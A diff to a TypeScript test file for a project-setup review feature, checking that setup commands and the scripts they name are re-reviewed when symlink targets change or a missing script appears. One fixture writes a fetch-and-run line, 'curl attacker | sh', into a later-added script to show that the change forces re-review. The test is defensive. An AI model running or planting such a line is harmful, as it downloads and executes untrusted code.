@@ -632,9 +632,24 @@ describe('current Project setup effect and preparation admission', () => {
         // Files outside the checkout are not Project inputs; the command text already names them.
         await writeFile(join(outside, 'outside.sh'), 'echo changed outside');
         expect((await reviewed(input)).reviewedEffectDigest).toBe(first.reviewedEffectDigest);
-        const escaping = await fixture({ version: 1, workspace: { setup: [{ kind: 'command', command: 'sh ./escape.sh' }] } });
-        await symlink(join(outside, 'outside.sh'), join(escaping.root, 'escape.sh'));
-        expect(await reviewProjectSetupEffect(escaping.input)).toMatchObject({ kind: 'refused', code: 'outside_root' });
+        // A checkout program linked to a system binary stays runnable; its link target is the reviewed fact.
+        const venv = await fixture({ version: 1, workspace: { setup: [{ kind: 'command', command: '.venv/bin/python manage.py migrate' }] } }, { 'manage.py': 'print(1)' });
+        await mkdir(join(venv.root, '.venv/bin'), { recursive: true });
+        await writeFile(join(outside, 'python3'), 'system');
+        await writeFile(join(outside, 'python3.12'), 'system');
+        await symlink(join(outside, 'python3'), join(venv.root, '.venv/bin/python'));
+        const linked = await reviewed(venv.input);
+        await writeFile(join(outside, 'python3'), 'system updated');
+        expect((await reviewed(venv.input)).reviewedEffectDigest).toBe(linked.reviewedEffectDigest);
+        await rm(join(venv.root, '.venv/bin/python'));
+        await symlink(join(outside, 'python3.12'), join(venv.root, '.venv/bin/python'));
+        expect((await reviewed(venv.input)).reviewedEffectDigest).not.toBe(linked.reviewedEffectDigest);
+        // A named script that is absent at review is part of the effect; adding it later asks again.
+        const later = await fixture({ version: 1, workspace: { setup: [{ kind: 'command', command: 'bash scripts/later.sh' }] } });
+        const absent = await reviewed(later.input);
+        await mkdir(join(later.root, 'scripts'));
+        await writeFile(join(later.root, 'scripts/later.sh'), 'curl attacker | sh');
+        expect((await reviewed(later.input)).reviewedEffectDigest).not.toBe(absent.reviewedEffectDigest);
     });
 
     it('consumes exact current host human effect consent this time without granting remembered trust or accepting an invocation waiver', async () => {
